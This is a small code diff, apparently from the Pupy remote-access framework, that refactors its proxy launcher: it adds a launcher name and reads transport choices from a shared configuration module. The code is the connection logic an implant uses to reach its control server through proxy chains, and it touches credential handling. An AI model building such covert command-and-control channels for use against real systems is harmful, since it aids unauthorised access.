@@ -24,15 +24,19 @@ from network.lib.proxies import (
 from network.lib.socks import ProxyError
 from network.lib.netcreds import add_cred
 
+from network.conf import transports
+
 from . import getLogger
 
 logger = getLogger('auto_proxy')
+
 
 class AutoProxyLauncher(BaseLauncher):
     '''
     Communicate to server via proxy or chain of proxies
     '''
 
+    name = 'auto_proxy'
     credentials = ['SSL_BIND_CERT']
 
     __slots__ = (
@@ -52,7 +56,7 @@ class AutoProxyLauncher(BaseLauncher):
             help='host:port of the pupy server to connect to. You can provide multiple '
             '--host arguments to attempt to connect to multiple IPs')
         cls.arg_parser.add_argument(
-            '-t', '--transport', choices=cls.transports, default='ssl',
+            '-t', '--transport', choices=transports, default='ssl',
             help='The transport to use')
         cls.arg_parser.add_argument(
             '-P', '--no-wpad', action='store_true', default=False,
